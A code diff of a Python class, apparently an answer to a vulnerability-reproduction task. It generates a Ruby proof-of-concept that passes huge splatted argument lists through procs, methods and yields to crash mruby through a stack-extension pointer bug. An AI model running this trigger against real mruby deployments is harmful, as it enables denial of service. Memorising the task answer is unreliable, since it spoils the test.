@@ -1,86 +1,119 @@
-import tarfile
+import os
 import io
-import re
 
 class Solution:
-    def _detect_max_reg(self, src_path: str) -> int:
-        # Try to detect register width from ops/insn headers; default to 255 (8-bit)
-        candidates = [
-            re.compile(r'GETARG_A\s*\(\s*[^)]*\)\s*[^&]*&\s*(0x[0-9a-fA-F]+|\d+)'),
-            re.compile(r'#define\s+MAXARG_A\s+(0x[0-9a-fA-F]+|\d+)'),
-        ]
-        try:
-            with tarfile.open(src_path, 'r:*') as tf:
-                for m in tf.getmembers():
-                    name = m.name.lower()
-                    if not m.isfile():
-                        continue
-                    if not any(x in name for x in ('ops.h', 'insn.h', 'opcode.h', 'vm.h', 'opcode_def.h', 'mruby/ops.h', 'mruby/insn.h')):
-                        continue
-                    try:
-                        data = tf.extractfile(m).read().decode('utf-8', errors='ignore')
-                    except Exception:
-                        continue
-                    for pat in candidates:
-                        for match in pat.finditer(data):
-                            val = match.group(1)
-                            try:
-                                if val.startswith('0x') or val.startswith('0X'):
-                                    mask = int(val, 16)
-                                else:
-                                    mask = int(val, 10)
-                                # If this is a mask like 0xff, max value is mask itself.
-                                if mask > 0 and mask < (1 << 20):  # sanity
-                                    # A register index is limited by mask, so max index is mask
-                                    # Use a conservative limit just below mask to avoid edge cases
-                                    return min(mask, 0xffff)
-                            except Exception:
-                                continue
-        except Exception:
-            pass
-        return 255
-
-    def _build_poc(self, nargs: int) -> bytes:
-        # Build a Ruby program that defines a method with many optional parameters
-        # to force mrb_stack_extend at method entry (OP_ENTER), which triggers the bug
-        # in vulnerable versions where regs pointer is not adjusted after reallocation.
-        parts = []
-        parts.append("def boom(")
-        # Generate parameters with default nil, break lines for readability
-        line = []
-        for i in range(nargs):
-            line.append(f"a{i}=nil")
-            if (i + 1) % 20 == 0:
-                parts.append(", ".join(line))
-                parts.append(",\n")
-                line = []
-            else:
-                if i != nargs - 1:
-                    line.append("")  # placeholder for comma insertion below
-        if line:
-            # Clean empty placeholders and join
-            filtered = [x for x in line if x]
-            if filtered:
-                parts.append(", ".join(filtered))
-        parts.append(")\n")
-        parts.append("  nil\n")
-        parts.append("end\n")
-        # Call the method; a single call should suffice, but we call it a few times
-        # to increase the chance of hitting reallocation conditions across allocators.
-        parts.append("3.times { boom() }\n")
-        s = "".join(parts)
-        return s.encode('utf-8')
-
     def solve(self, src_path: str) -> bytes:
-        max_reg = self._detect_max_reg(src_path)
-        # Choose number of args conservatively below detected max register index
-        # to avoid compiler limits. Also ensure it's large enough to likely trigger
-        # a stack extension from the default initial stack size (commonly ~128).
-        if max_reg >= 1000:
-            nargs = 900
-        elif max_reg >= 512:
-            nargs = 450
-        else:
-            # For 8-bit (255) or similar, keep a safe margin
-            nargs = min(250, max_reg - 5 if max_reg > 5 else 200)
-        return self._build_poc(nargs)
+        # Aggressive Ruby PoC attempting to trigger VM stack extension scenarios
+        # through large argument passing to methods, procs, blocks, and yields.
+        # The script tries multiple independent patterns so that vulnerable
+        # versions of mruby that mishandle mrb_stack_extend pointer adjustments
+        # have high chance to crash, while fixed versions safely complete.
+        rb = io.StringIO()
+        rb.write("begin\n")
+        rb.write("  SZ = 100000\n")
+        rb.write("  arr = Array.new(SZ, 1)\n")
+        rb.write("rescue\n")
+        rb.write("  SZ = 40000\n")
+        rb.write("  arr = Array.new(SZ, 1)\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Proc with optional and splat args\n")
+        rb.write("  p1 = Proc.new { |a=0, *r, &blk| 0 }\n")
+        rb.write("  p1.call(*arr)\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Another Proc variant\n")
+        rb.write("  p2 = Proc.new { |a, b=1, *r, &blk| 0 }\n")
+        rb.write("  p2.call(*arr)\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Method with many optional params and splat/block\n")
+        rb.write("  eval(\"def m1(")
+        # generate many optional parameters to stress OP_ENTER and default arg handling
+        opt_params = [f"a{i}=nil" for i in range(120)]
+        rb.write(",".join(opt_params))
+        rb.write(", *r, &blk);")
+        # local variable pressure to increase nregs in the body
+        rb.write(";".join([f"x{i}={i%3}" for i in range(150)]))
+        rb.write(";nil;end\")\n")
+        rb.write("  m1(*arr) { nil }\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Method with fewer locals but many optionals to vary shape\n")
+        rb.write("  eval(\"def m2(")
+        opt_params2 = [f"o{i}=0" for i in range(80)]
+        rb.write(",".join(opt_params2))
+        rb.write(", &blk);nil;end\")\n")
+        rb.write("  m2(*arr) { nil }\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Yield to proc with many args\n")
+        rb.write("  def yield_many(a, &blk); yield(*a); end\n")
+        rb.write("  yield_many(arr, &p1)\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Define method using define_method to create a Proc-backed method\n")
+        rb.write("  C = Class.new\n")
+        rb.write("  C.send(:define_method, :mm) { |h=0, *r, &blk| 0 }\n")
+        rb.write("  C.new.mm(*arr) { nil }\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Nested call passing huge arg list through multiple frames\n")
+        rb.write("  def fwd1(*x, &b); fwd2(*x, &b); end\n")
+        rb.write("  def fwd2(*x, &b); fwd3(*x, &b); end\n")
+        rb.write("  def fwd3(a=0, *x, &b); 0; end\n")
+        rb.write("  fwd1(*arr) { nil }\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Call lambdas with complex arg layout\n")
+        rb.write("  l1 = lambda { |a=0, b=1, *r, &blk| 0 }\n")
+        rb.write("  l1.call(*arr) { nil }\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Indirect send with splat to stress call setup\n")
+        rb.write("  def target(a=0, *r, &blk); 0; end\n")
+        rb.write("  self.send(:target, *arr) { nil }\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Trigger a second extension after initial allocations to increase realloc chance\n")
+        rb.write("  more = arr + Array.new(SZ/2, 2)\n")
+        rb.write("  p1.call(*more)\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Pass huge args into block via yield and via &proc again\n")
+        rb.write("  def trampoline(&blk); blk.call(*Array.new(SZ, 3)); end\n")
+        rb.write("  trampoline(&p2)\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("begin\n")
+        rb.write("  # Create a block with defaults and rest, invoked with many args via each\n")
+        rb.write("  blk = Proc.new { |z=0, *r, &b| 0 }\n")
+        rb.write("  def feeder(a, &blk); blk.call(*a); end\n")
+        rb.write("  feeder(arr, &blk)\n")
+        rb.write("rescue => e\n")
+        rb.write("end\n")
+        rb.write("\n")
+        rb.write("# Done\n")
+        return rb.getvalue().encode("utf-8")
